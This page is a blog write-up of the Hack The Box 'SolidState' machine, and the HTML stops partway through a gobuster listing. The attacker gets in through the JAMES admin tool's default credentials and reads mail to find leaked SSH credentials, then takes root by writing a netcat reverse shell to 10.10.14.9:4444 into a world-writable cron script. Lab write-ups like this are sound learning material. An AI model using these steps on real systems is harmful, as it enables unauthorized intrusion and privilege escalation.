<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Solidstate | PwndSide</title><meta name=keywords content="privesc,web,linux,ssh"><meta name=description content="Linux machine with three mail services and a admin tool to manage them, we take advantage of the default credentials of the tool to get email users and thanks to the credentials leak in one email we obtained access as user. We got the privesc thanks to a cronjob."><meta name=author content="Ayman Boulaich"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css integrity="sha256-j+ECM6cGvIfy4Is8+XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as=style><link rel=icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://pwndside.github.io/posts/solidstate-htb/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://pwndside.github.io/posts/solidstate-htb/"><meta property="og:site_name" content="PwndSide"><meta property="og:title" content="Solidstate"><meta property="og:description" content="Linux machine with three mail services and a admin tool to manage them, we take advantage of the default credentials of the tool to get email users and thanks to the credentials leak in one email we obtained access as user. We got the privesc thanks to a cronjob."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-08-15T19:04:20+02:00"><meta property="article:modified_time" content="2023-08-15T19:04:20+02:00"><meta property="article:tag" content="Privesc"><meta property="article:tag" content="Web"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Ssh"><meta property="og:image" content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:title content="Solidstate"><meta name=twitter:description content="Linux machine with three mail services and a admin tool to manage them, we take advantage of the default credentials of the tool to get email users and thanks to the credentials leak in one email we obtained access as user. We got the privesc thanks to a cronjob."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://pwndside.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Solidstate","item":"https://pwndside.github.io/posts/solidstate-htb/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Solidstate","name":"Solidstate","description":"Linux machine with three mail services and a admin tool to manage them, we take advantage of the default credentials of the tool to get email users and thanks to the credentials leak in one email we obtained access as user. We got the privesc thanks to a cronjob.","keywords":["privesc","web","linux","ssh"],"articleBody":"Room Information Room name: SolidState Difficulty level: Medium Room link: https://app.hackthebox.com/machines/Solidstate Tools Used nmap gobuster moniProc.sh Port Scanning sudo nmap $IP -n -Pn -vvv --min-rate 5000 6 │ PORT STATE SERVICE REASON VERSION 7 │ 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) 8 │ | ssh-hostkey: 9 │ | 2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA) 10 │ | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp5WdwlckuF4slNUO29xOk/Yl/cnXT/p6qwezI0ye+4iRSyor8lhyAEku/yz8KJXtA+ALhL7HwYbD3hDUxDkFw90V1Omdedbk7SxUVBPK2CiDpvXq1+r5fVw26WpTCdawGKkaOMYoSWvliBsbwMLJEUwVbZ/GZ1 │ SUEswpYkyZeiSC1qk72L6CiZ9/5za4MTZw8Cq0akT7G+mX7Qgc+5eOEGcqZt3cBtWzKjHyOZJAEUtwXAHly29KtrPUddXEIF0qJUxKXArEDvsp7OkuQ0fktXXkZuyN/GRFeu3im7uQVuDgiXFKbEfmoQAsvLrR8YiKFUG6QBdI9awwmTkLFbS1Z 11 │ | 256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA) 12 │ | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISyhm1hXZNQl3cslogs5LKqgWEozfjs3S3aPy4k3riFb6UYu6Q1QsxIEOGBSPAWEkevVz1msTrRRyvHPiUQ+eE= 13 │ | 256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519) 14 │ |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKbFbK3MJqjMh9oEw/2OVe0isA7e3ruHz5fhUP4cVgY 15 │ 25/tcp open smtp syn-ack ttl 63 JAMES smtpd 2.3.2 16 │ |_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.5 [10.10.14.5]) 17 │ 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.25 ((Debian)) 18 │ |_http-title: Home - Solid State Security 19 │ | http-methods: 20 │ |_ Supported Methods: HEAD GET POST OPTIONS 21 │ |_http-server-header: Apache/2.4.25 (Debian) 22 │ 110/tcp open pop3 syn-ack ttl 63 JAMES pop3d 2.3.2 23 │ 119/tcp open nntp syn-ack ttl 63 JAMES nntpd (posting ok) 24 │ 4555/tcp open rsip? syn-ack ttl 63 25 │ | fingerprint-strings: 26 │ | GenericLines: 27 │ | JAMES Remote Administration Tool 2.3.2 28 │ | Please enter your login and password 29 │ | Login id: 30 │ | Password: 31 │ | Login failed for 32 │ |_ Login id: 33 │ 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : 34 │ SF-Port4555-TCP:V=7.94%I=7%D=8/10%Time=64D40DF2%P=arm-apple-darwin22.4.0%r 35 │ SF:(GenericLines,7C,\"JAMES\\x20Remote\\x20Administration\\x20Tool\\x202\\.3\\.2\\ 36 │ SF:nPlease\\x20enter\\x20your\\x20login\\x20and\\x20password\\nLogin\\x20id:\\nPas 37 │ SF:sword:\\nLogin\\x20failed\\x20for\\x20\\nLogin\\x20id:\\n\"); 38 │ Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel In this machine we have 6 open ports, one for ssh service, two for email services (smtp and pop3), a nntp port which is a protocol used for distributing, reading, and posting Usenet newsgroups and a rsip? port which is a networking protocol primarily designed for Network Address Translation (NAT) traversal.\nWe can observe what is shown when we try to connect on port 4555, look like a Administration Tool and has the same version as the email services so maybe is managing the mail services.\nEnumeration First as always let’s start with the website.\nOnce inside we can find a homepage and a menu which displays two more pages\nNavigating the website and hovering the redirect urls we don’t find any other interesting page or relevant info. Let’s fuzz the page with gobuster.\ngobuster dir -u http://cronos.htb/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,sh,txt -o fuzz | tee fuzz.save 1 │ =============================================================== 2 │ Gobuster v3.5 3 │ by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) 4 │ =============================================================== 5 │ [+] Url: http://10.10.10.51/ 6 │ [+] Method: GET 7 │ [+] Threads: 10 8 │ [+] Wordlist: /Users/aymanboulaichdahhou/Documents/wordlists/KaliLists/dirb/common.txt 9 │ [+] Negative Status codes: 404 10 │ [+] User Agent: gobuster/3.5 11 │ [+] Extensions: cgi,css,sh,html,js,txt,php,py 12 │ [+] Add Slash: true 13 │ [+] Timeout: 10s 14 │ =============================================================== 15 │ 2023/08/10 14:30:41 Starting gobuster in directory enumeration mode 16 │ =============================================================== 17 │ /.html/ (Status: 403) [Size: 292] 18 │ /.hta.py/ (Status: 403) [Size: 294] 19 │ /.hta/ (Status: 403) [Size: 291] 20 │ /.hta.cgi/ (Status: 403) [Size: 295] 21 │ /.hta.css/ (Status: 403) [Size: 295] 22 │ /.hta.sh/ (Status: 403) [Size: 294] 23 │ /.hta.html/ (Status: 403) [Size: 296] 24 │ /.hta.php/ (Status: 403) [Size: 295] 25 │ /.hta.txt/ (Status: 403) [Size: 295] 26 │ /.hta.js/ (Status: 403) [Size: 294] 27 │ /.htaccess.txt/ (Status: 403) [Size: 300] 28 │ /.htaccess/ (Status: 403) [Size: 296] 29 │ /.htaccess.js/ (Status: 403) [Size: 299] 30 │ /.htaccess.css/ (Status: 403) [Size: 300] 31 │ /.htaccess.php/ (Status: 403) [Size: 300] 32 │ /.htaccess.py/ (Status: 403) [Size: 299] 33 │ /.htaccess.cgi/ (Status: 403) [Size: 300] 34 │ /.htaccess.sh/ (Status: 403) [Size: 299] 35 │ /.htpasswd/ (Status: 403) [Size: 296] 36 │ /.htaccess.html/ (Status: 403) [Size: 301] 37 │ /.htpasswd.txt/ (Status: 403) [Size: 300] 38 │ /.htpasswd.php/ (Status: 403) [Size: 300] 39 │ /.htpasswd.py/ (Status: 403) [Size: 299] 40 │ /.htpasswd.css/ (Status: 403) [Size: 300] 41 │ /.htpasswd.cgi/ (Status: 403) [Size: 300] 42 │ /.htpasswd.html/ (Status: 403) [Size: 301] 43 │ /.htpasswd.sh/ (Status: 403) [Size: 299] 44 │ /.htpasswd.js/ (Status: 403) [Size: 299] 45 │ /assets/ (Status: 200) [Size: 1496] 46 │ /icons/ (Status: 403) [Size: 292] 47 │ /images/ (Status: 200) [Size: 2516] 48 │ /server-status/ (Status: 403) [Size: 300] 49 │ 50 │ =============================================================== 51 │ 2023/08/10 14:42:35 Finished 52 │ =============================================================== At this point I’ll move on from HTTP\nLet’s move to the rsip? port which seems a Admin Tool.\nnc -nv $IP 4555 By accessing we need to provide an user and password in order to use the tool. Trying the default/common creds, I got access with root/root.\nOnce in we can display all the commands which we can use with HELP.\nTwo are really relevant, the listusers which display the existent users and setpassword which set a user’s password.\nListing the user’s we have the next output\nWe have mail users now let’s set a user password for each user and set a new password for each one.\nNow let’s see the receiving emails by connecting with POP3 for each user in order to see any kind of relevant info. I used telnet to connect because has worked better for me.\njames and thomas don’t have emails\njohn has one let’s see what we found in it.\nThe mailadmin is writing john to send a mail with a credentials to mindy.\nIn the mindy’s inbox we found two emails. Let’s see if we find the credentials.\nIn the first email, Mindy is welcomed to the cyber team.\nGaining an Initial Foothold We have the ssh credentials of mindy let’s access to the machine as mindy.\nLet’s cat the user’s flag.\nEscalating Privilege We can observe that we have a restricted bash, which has a limited $PATH which doesn’t let us use all the commands. A easy form to change that is exporting a new PATH but the PATH doesn’t seem to be writable.\nWe can also force ssh to execute a command like bash, putting it as a argument starts the ssh session in a normal bash. We have a dumb shell, we need to treat the shell to move to a fully interactive one (I explained how to do it in a bunch write ups).\nNow we need to check if we are in with the htb ip address and without a docker container.\nip a 1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens192: mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:50:56:b9:a2:cd brd ff:ff:ff:ff:ff:ff inet 10.10.10.51/24 brd 10.10.10.255 scope global ens192 valid_lft forever preferred_lft forever inet6 dead:beef::250:56ff:feb9:a2cd/64 scope global mngtmpaddr dynamic valid_lft 86394sec preferred_lft 14394sec inet6 fe80::250:56ff:feb9:a2cd/64 scope link valid_lft forever preferred_lft forever We are in the machine so let’s see if there is sudo privileges to privesc.\nNothing relevant so let’s move to the use of moniProc.sh (the script which I have used in the Cronos machine) in order to see scheduled jobs or cronjobs running at foreground.\n\u003e /usr/sbin/CRON -f \u003e /bin/sh -c python /opt/tmp.py \u003e python /opt/tmp.py \u003c /usr/sbin/CRON -f \u003c /bin/sh -c python /opt/tmp.py \u003c python /opt/tmp.py There is a cronjob running a script located at /opt/tmp.py.\nIs created by root and others can edit the file, so If the cronjob is being executed by the root user we are able to execute whatever we want as root.\n#!/usr/bin/env python import os import sys try: os.system('rm -r /tmp/* ') except: sys.exit() The content of tmp.py is pretty convenient for us, we only need to change the command that is executing the program.\n#!/usr/bin/env python import os import sys try: os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.10.14.9 4444 \u003e/tmp/f' except: sys.exit() I put a reverse shell with nc and set a nc listener.\nnc -lv 4444 We are root now.\nThank you for reading, and happy hacking! 😄\n","wordCount":"1336","inLanguage":"en","image":"https://pwndside.github.io/%3Cimage%20path/url%3E","datePublished":"2023-08-15T19:04:20+02:00","dateModified":"2023-08-15T19:04:20+02:00","author":{"@type":"Person","name":"Ayman Boulaich"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://pwndside.github.io/posts/solidstate-htb/"},"publisher":{"@type":"Organization","name":"PwndSide","logo":{"@type":"ImageObject","url":"https://pwndside.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://pwndside.github.io/ accesskey=h title="PwndSide (Alt + H)"><img src=https://pwndside.github.io/apple-touch-icon.png alt aria-label=logo height=35>PwndSide</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://pwndside.github.io/categories/hackthebox title=HackTheBox><span>HackTheBox</span></a></li><li><a href=https://pwndside.github.io/categories/ctf title="CTF's"><span>CTF's</span></a></li><li><a href=https://pwndside.github.io/about/whoami/ title=whoami><span>whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://pwndside.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://pwndside.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Solidstate</h1><div class=post-description>Linux machine with three mail services and a admin tool to manage them, we take advantage of the default credentials of the tool to get email users and thanks to the credentials leak in one email we obtained access as user. We got the privesc thanks to a cronjob.</div><div class=post-meta><span title='2023-08-15 19:04:20 +0200 CEST'>August 15, 2023</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;1336 words&nbsp;·&nbsp;Ayman Boulaich&nbsp;|&nbsp;<a href=https://github.com/pwndside/pwndside.github.io/content/posts/solidstate-htb.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#room-information>Room Information</a></li><li><a href=#tools-used>Tools Used</a></li><li><a href=#port-scanning>Port Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#gaining-an-initial-foothold>Gaining an Initial Foothold</a></li><li><a href=#escalating-privilege>Escalating Privilege</a></li></ul></nav></div></details></div><div class=post-content><h2 id=room-information>Room Information<a hidden class=anchor aria-hidden=true href=#room-information>#</a></h2><ul><li>Room name: SolidState</li><li>Difficulty level: Medium</li><li>Room link: <a href=https://app.hackthebox.com/machines/Solidstate>https://app.hackthebox.com/machines/Solidstate</a></li></ul><p><img alt=Untitled loading=lazy src=/HTB/solidstate-icon.png></p><h2 id=tools-used>Tools Used<a hidden class=anchor aria-hidden=true href=#tools-used>#</a></h2><ul><li>nmap</li><li>gobuster</li><li>moniProc.sh</li></ul><h2 id=port-scanning>Port Scanning<a hidden class=anchor aria-hidden=true href=#port-scanning>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap <span class=nv>$IP</span> -n -Pn -vvv --min-rate <span class=m>5000</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>   <span class=m>6</span>   │ PORT     STATE SERVICE REASON         VERSION
</span></span><span class=line><span class=cl>   <span class=m>7</span>   │ 22/tcp   open  ssh     syn-ack ttl <span class=m>63</span> OpenSSH 7.4p1 Debian 10+deb9u1 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl>   <span class=m>8</span>   │ <span class=p>|</span> ssh-hostkey:
</span></span><span class=line><span class=cl>   <span class=m>9</span>   │ <span class=p>|</span>   <span class=m>2048</span> 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=m>10</span>   │ <span class=p>|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp5WdwlckuF4slNUO29xOk/Yl/cnXT/p6qwezI0ye+4iRSyor8lhyAEku/yz8KJXtA+ALhL7HwYbD3hDUxDkFw90V1Omdedbk7SxUVBPK2CiDpvXq1+r5fVw26WpTCdawGKkaOMYoSWvliBsbwMLJEUwVbZ/GZ1
</span></span><span class=line><span class=cl>       │ SUEswpYkyZeiSC1qk72L6CiZ9/5za4MTZw8Cq0akT7G+mX7Qgc+5eOEGcqZt3cBtWzKjHyOZJAEUtwXAHly29KtrPUddXEIF0qJUxKXArEDvsp7OkuQ0fktXXkZuyN/GRFeu3im7uQVuDgiXFKbEfmoQAsvLrR8YiKFUG6QBdI9awwmTkLFbS1Z
</span></span><span class=line><span class=cl>  <span class=m>11</span>   │ <span class=p>|</span>   <span class=m>256</span> 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=m>12</span>   │ <span class=p>|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISyhm1hXZNQl3cslogs5LKqgWEozfjs3S3aPy4k3riFb6UYu6Q1QsxIEOGBSPAWEkevVz1msTrRRyvHPiUQ+eE<span class=o>=</span>
</span></span><span class=line><span class=cl>  <span class=m>13</span>   │ <span class=p>|</span>   <span class=m>256</span> e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=m>14</span>   │ <span class=p>|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKbFbK3MJqjMh9oEw/2OVe0isA7e3ruHz5fhUP4cVgY
</span></span><span class=line><span class=cl>  <span class=m>15</span>   │ 25/tcp   open  smtp    syn-ack ttl <span class=m>63</span> JAMES smtpd 2.3.2
</span></span><span class=line><span class=cl>  <span class=m>16</span>   │ <span class=p>|</span>_smtp-commands: solidstate Hello nmap.scanme.org <span class=o>(</span>10.10.14.5 <span class=o>[</span>10.10.14.5<span class=o>])</span>
</span></span><span class=line><span class=cl>  <span class=m>17</span>   │ 80/tcp   open  http    syn-ack ttl <span class=m>63</span> Apache httpd 2.4.25 <span class=o>((</span>Debian<span class=o>))</span>
</span></span><span class=line><span class=cl>  <span class=m>18</span>   │ <span class=p>|</span>_http-title: Home - Solid State Security
</span></span><span class=line><span class=cl>  <span class=m>19</span>   │ <span class=p>|</span> http-methods:
</span></span><span class=line><span class=cl>  <span class=m>20</span>   │ <span class=p>|</span>_  Supported Methods: HEAD GET POST OPTIONS
</span></span><span class=line><span class=cl>  <span class=m>21</span>   │ <span class=p>|</span>_http-server-header: Apache/2.4.25 <span class=o>(</span>Debian<span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=m>22</span>   │ 110/tcp  open  pop3    syn-ack ttl <span class=m>63</span> JAMES pop3d 2.3.2
</span></span><span class=line><span class=cl>  <span class=m>23</span>   │ 119/tcp  open  nntp    syn-ack ttl <span class=m>63</span> JAMES nntpd <span class=o>(</span>posting ok<span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=m>24</span>   │ 4555/tcp open  rsip?   syn-ack ttl <span class=m>63</span>
</span></span><span class=line><span class=cl>  <span class=m>25</span>   │ <span class=p>|</span> fingerprint-strings:
</span></span><span class=line><span class=cl>  <span class=m>26</span>   │ <span class=p>|</span>   GenericLines:
</span></span><span class=line><span class=cl>  <span class=m>27</span>   │ <span class=p>|</span>     JAMES Remote Administration Tool 2.3.2
</span></span><span class=line><span class=cl>  <span class=m>28</span>   │ <span class=p>|</span>     Please enter your login and password
</span></span><span class=line><span class=cl>  <span class=m>29</span>   │ <span class=p>|</span>     Login id:
</span></span><span class=line><span class=cl>  <span class=m>30</span>   │ <span class=p>|</span>     Password:
</span></span><span class=line><span class=cl>  <span class=m>31</span>   │ <span class=p>|</span>     Login failed <span class=k>for</span>
</span></span><span class=line><span class=cl>  <span class=m>32</span>   │ <span class=p>|</span>_    Login id:
</span></span><span class=line><span class=cl>  <span class=m>33</span>   │ <span class=m>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl>  <span class=m>34</span>   │ SF-Port4555-TCP:V<span class=o>=</span>7.94%I<span class=o>=</span>7%D<span class=o>=</span>8/10%Time<span class=o>=</span>64D40DF2%P<span class=o>=</span>arm-apple-darwin22.4.0%r
</span></span><span class=line><span class=cl>  <span class=m>35</span>   │ SF:<span class=o>(</span>GenericLines,7C,<span class=s2>&#34;JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\
</span></span></span><span class=line><span class=cl><span class=s2>  36   │ SF:nPlease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPas
</span></span></span><span class=line><span class=cl><span class=s2>  37   │ SF:sword:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=m>38</span>   │ Service Info: Host: solidstate<span class=p>;</span> OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>In this machine we have 6 open ports, one for <strong>ssh</strong> service, two for email services (<strong>smtp</strong> and <strong>pop3</strong>), a <strong>nntp</strong> port which is a protocol used for distributing, reading, and posting Usenet newsgroups and a <strong>rsip?</strong> port which is a networking protocol primarily designed for Network Address Translation (NAT) traversal.</p><p>We can observe what is shown when we try to connect on port 4555, look like a Administration Tool and has the same version as the email services so maybe is managing the mail services.</p><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><p>First as always let’s start with the website.</p><p><img alt=Untitled loading=lazy src=/HTB/solidstate-1.png></p><p>Once inside we can find a homepage and a menu which displays two more pages</p><p><img alt=Untitled loading=lazy src=/HTB/solidstate-2.png></p><p>Navigating the website and hovering the redirect urls we don’t find any other interesting page or relevant info. Let’s fuzz the page with <strong>gobuster.</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u http://cronos.htb/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -x php,html,css,js,py,sh,txt -o fuzz <span class=p>|</span> tee fuzz.save
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>   <span class=m>1</span>   │ <span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>   <span class=m>2</span>   │ Gobuster v3.5
</span></span><span class=line><span class=cl>   <span class=m>3</span>   │ by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl>   <span class=m>4</span>   │ <span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>   <span class=m>5</span>   │ <span class=o>[</span>+<span class=o>]</span> Url:                     http://10.10.10.51/
</span></span><span class=line><span class=cl>   <span class=m>6</span>   │ <span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl>   <span class=m>7</span>   │ <span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl>   <span class=m>8</span>   │ <span class=o>[</span>+<span class=o>]</span> Wordlist:                /Users/aymanboulaichdahhou/Documents/wordlists/KaliLists/dirb/common.txt
</span></span><span class=line><span class=cl>   <span class=m>9</span>   │ <span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl>  <span class=m>10</span>   │ <span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.5
</span></span><span class=line><span class=cl>  <span class=m>11</span>   │ <span class=o>[</span>+<span class=o>]</span> Extensions:              cgi,css,sh,html,js,txt,php,py
</span></span><span class=line><span class=cl>  <span class=m>12</span>   │ <span class=o>[</span>+<span class=o>]</span> Add Slash:               <span class=nb>true</span>
</span></span><span class=line><span class=cl>  <span class=m>13</span>   │ <span class=o>[</span>+<span class=o>]</span> Timeout:                 10s
</span></span><span class=line><span class=cl>  <span class=m>14</span>   │ <span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>  <span class=m>15</span>   │ 2023/08/10 14:30:41 Starting gobuster in directory enumeration mode
</span></span><span class=line><span class=cl>  <span class=m>16</span>   │ <span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>  <span class=m>17</span>   │ /.html/               <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 292<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>18</span>   │ /.hta.py/             <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 294<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>19</span>   │ /.hta/                <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 291<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>20</span>   │ /.hta.cgi/            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 295<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>21</span>   │ /.hta.css/            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 295<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>22</span>   │ /.hta.sh/             <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 294<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>23</span>   │ /.hta.html/           <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 296<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>24</span>   │ /.hta.php/            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 295<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>25</span>   │ /.hta.txt/            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 295<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>26</span>   │ /.hta.js/             <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 294<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>27</span>   │ /.htaccess.txt/       <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 300<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>28</span>   │ /.htaccess/           <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 296<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>29</span>   │ /.htaccess.js/        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 299<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>30</span>   │ /.htaccess.css/       <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 300<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>31</span>   │ /.htaccess.php/       <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 300<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>32</span>   │ /.htaccess.py/        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 299<span class=o>]</span>
